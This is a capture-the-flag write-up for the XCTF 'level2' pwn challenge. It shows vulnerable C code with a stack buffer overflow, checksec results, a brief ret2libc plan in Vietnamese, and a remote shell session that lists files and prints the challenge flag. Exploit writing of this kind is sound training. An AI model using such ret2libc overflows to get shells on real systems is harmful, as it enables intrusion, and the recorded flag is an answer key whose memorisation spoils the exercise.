# XCTF - PWN Exercise - level2

```c
#include<stdio.h>

ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  system("echo Input:");
  return read(0, buf, 0x100u);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  system("echo 'Hello World!'");
  return 0;
}
```

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/1_level2 λ checksec level2   
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/1_level2/level2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

ham read cho nhap 0x100 = 256 ma buf[136]
-> khong co ham chien thang nhu flag hay thuc thi shell
-> PIE khong bat nen su dung ret2libc
-> ret ve shell 
-> tim system, exit va shell

Tiến hành viết file [exploit.py](exploit.py) và khai thác:

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/1_level2 λ python2 exploit.py 
[+] Opening connection to 111.200.241.244 on port 63253: Done
[*] Switching to interactive mode
$ ls
bin
dev
flag
level2
lib
lib32
lib64
$ cat flag
cyberpeace{a47dd0c3f651ec778da26ae79c5c255a}
$  
```
